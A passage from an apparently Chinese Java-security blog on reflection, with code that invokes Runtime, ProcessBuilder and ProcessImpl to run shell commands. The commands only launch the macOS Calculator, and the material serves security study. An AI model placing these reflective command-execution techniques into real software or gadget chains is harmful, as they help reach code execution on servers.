boolean">true</span><span class="token punctuation">,</span> currentLoader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2022/03/22/java-reflection/6.png"><br>默认情况下，<code>forName</code>的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就是<code>ClassLoader</code>。</li></ul><h2 id="反射调用函数"><a href="#反射调用函数" class="headerlink" title="反射调用函数"></a>反射调用函数</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">student</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"D"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"My name is "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">", My Age is "</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test1</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        student<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//反射调用Student</span>        <span class="token class-name">String</span> class_name <span class="token operator">=</span> <span class="token string">"student.Student"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> func <span class="token operator">=</span> <span class="token string">"sayHello"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> stu_class <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>class_name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Student</span> stu2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">)</span> stu_class<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>class_name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>stu2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>getDeclaredMethod()</code>: Returns a Method object that reflects the specified declared method of the class or interface represented by this Class object.</li><li><code>getMethod()</code>:         returns a Method object that reflects the specified public member method of the class or interface represented by this Class object.</li></ul><p><code>getDeclaredMethod()</code>可以获取类里面任何方法，<code>getMethod()</code>只可以获取<code>public</code>属性的方法。另外几个比较用的多是是:</p><ul><li><code>getField(String name)</code>: 根据字段名获取对应的字段，只能获取public类型的字段，可以获取父类的字段。</li><li><code>getFields()</code>: 获取类所有的字段，只能获取public类型的字段，可以获取父类的字段。</li><li><code>getDeclaredField(String name)</code>: 根据字段名获取对应的字段，可以获取public、protected和private类型的字段，不能获取父类的字段。</li><li><code>getDeclaredFields()</code>: 获取类所有的字段，包括public、protected和private。不能获取父类的字段。</li></ul><h4 id="通过反射获取修改私有变量"><a href="#通过反射获取修改私有变量" class="headerlink" title="通过反射获取修改私有变量"></a>通过反射获取修改私有变量</h4><p><img src="/2022/03/22/java-reflection/7.png"></p><p><strong>如果字段是staic修饰的时候，在获取和修改字段的时候，可以使用null代替具体对象的stu</strong></p><h4 id="通过反射调用私有方法"><a href="#通过反射调用私有方法" class="headerlink" title="通过反射调用私有方法"></a>通过反射调用私有方法</h4><p><img src="/2022/03/22/java-reflection/8.png"></p><p>如果调用的方法有多个参数，需要以数组的形式传入：<br><img src="/2022/03/22/java-reflection/9.png"></p><ul><li>使用<code>getDeclaredMethod</code>获取多个参数的方法，第二个参数为new Class[]{}类型的数组，数组中每一个值对应参数的class对象。这是一种标准的传参方式，建议即使方法没有参数或者只有一个参数也按照这种方式传参</li><li>使用<code>method.invoke</code>方法对方法进行调用，传递的第二个参数表示实际调用时传递的参数值，类型是Object数组。<br>对于static类型的方法，与字段的使用方法相似，在执行方法时，同样可以把obj对象换成null</li></ul><h4 id="反射获取构造函数"><a href="#反射获取构造函数" class="headerlink" title="反射获取构造函数"></a>反射获取构造函数</h4><p>构造函数是一种特殊的方法，很多情况下需要通过反射获取构造函数，然后通过构造函数生成类的实例。</p><ul><li><code>getConstructor(Class... parameterTypes)</code> 根据参数类型获取对应的构造函数，只能获取public类型的构造函数，不能获取父类的构造函数。</li><li><code>getConstructors()</code> 获取类所有的构造函数，只能获取public类型的字段，不能获取父类的构造函数。</li><li><code>getDeclaredConstructor (Class... parameterTypes)</code> 根据参数类型获取对应的构造函数，可以获取public、protected和private类型的构造函数，不能获取父类的构造函数。</li><li><code>getDeclaredConstructors()</code> 获取类所有的构造函数，包括public、protected和private。不能获取父类的构造函数。</li></ul><p>在获取到构造函数之后，需要通过newInstance函数来生成类对象。关于newInstance的使用如下所示：</p><ul><li><code>newInstance(Object ... initargs)</code>: newInstance函数接受可变的参数个数，构造函数实际有几个传输，这里就传递几个参数值。newInstance返回的数据类型是Object，一般需要强制转换类型。</li></ul><p><img src="/2022/03/22/java-reflection/10.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://javasec.org/javase/Reflection/Reflection.html">javasec.org</a></li><li><a href="https://www.freebuf.com/articles/web/308460.html">Java代码审计之反射</a></li><li><a href="https://github.com/phith0n/JavaThings">Java安全漫谈</a></li><li><a href="https://xz.aliyun.com/t/9002">JAVA安全基础</a></li><li><a href="https://xz.aliyun.com/t/7029/">JAVA反序列化 - 反射机制</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483830&idx=1&sn=39c08c61cbab36ace4ac691e0756948b&chksm=c2a1d53ff5d65c29f9b8310c324c67568fe27e61720baffff8af19ef9cb94f5096d73df0c69f">告别脚本小子系列丨JAVA安全(3)——JAVA反射机制</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java安全笔记(2)-反射执行系统命令</title>
      <link href="/2022/03/22/java-reflection-shell.html"/>
      <url>/2022/03/22/java-reflection-shell.html</url>
      
        <content type="html"><![CDATA[<h2 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h2><p>Runtime中可以获取到<code>Runtime</code>实例有三种方法:</p><ol><li><code>private static Runtime currentRuntime = new Runtime();</code></li><li><code>public static Runtime getRuntime()</code></li><li><code>private Runtime() &#123;&#125;</code></li></ol><p><img src="/2022/03/22/java-reflection-shell/2.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectRuntime</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">//利用私有变量生成实例 private static Runtime currentRuntime = new Runtime();</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"currentRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">//利用     public static Runtime getRuntime() &#123;</span>        <span class="token comment">//        return currentRuntime;</span>        <span class="token comment">//    &#125;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 利用构造函数 private Runtime() &#123;&#125;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><p>使用<code>constructor</code>初始化对象的时候，接收的参数是一个Object数组，所以需要<code>new Object[]</code>强制转换: </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectProcessBuilder</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPB0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//newInstance接收的是一个Object数组，需要转化一下</span>        <span class="token class-name">ProcessBuilder</span> pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//当使用List类型的构造参数</span>        <span class="token comment">//newInstance接收的是一个Object数组，需要转化一下</span>        <span class="token class-name">ProcessBuilder</span> pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ReflectProcessBuilder</span> reflectProcessBuilder <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">ReflectProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        reflectProcessBuilder.ReflectPB0();</span>        <span class="token class-name"><span class="token namespace">reflectProcessBuilder<span class="token punctuation">.</span></span>ReflectPB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectProcessImpl</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPI0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">ProcessBuilder<span class="token punctuation">.</span>Redirect</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">ProcessBuilder<span class="token punctuation">.</span>Redirect</span><span class="token punctuation">[</span><span class="token punctuation">]</span> redirect <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> dir <span class="token operator">=</span> <span class="token string">"."</span><span class="token punctuation">;</span>        <span class="token comment">//第四个参数dir不能为空，为空会失败，表示在哪个路径下执行命令</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">,</span> map<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ReflectProcessImpl</span> reflectProcess <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectProcessImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">reflectProcess<span class="token punctuation">.</span></span>ReflectPI0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ForkAndExec"><a href="#ForkAndExec" class="headerlink" title="ForkAndExec"></a>ForkAndExec</h2><p>可以使用ASM执行，参考su18师傅的<a href="https://github.com/su18/JNDI/blob/master/src/main/java/org/su18/asm/payload/Command.java">JNDI</a></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul><li>反射执行命令的时候，首先需要明白如何获取实例的对象，见Runtime执行命令的三种方式</li><li><code>constructor</code>初始化对象的时候，注意参数是Object数组，使用<code>new Object[]</code>强制转换</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xiashang.xyz/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/">记一次无文件Webshell攻击分析</a></li><li><a 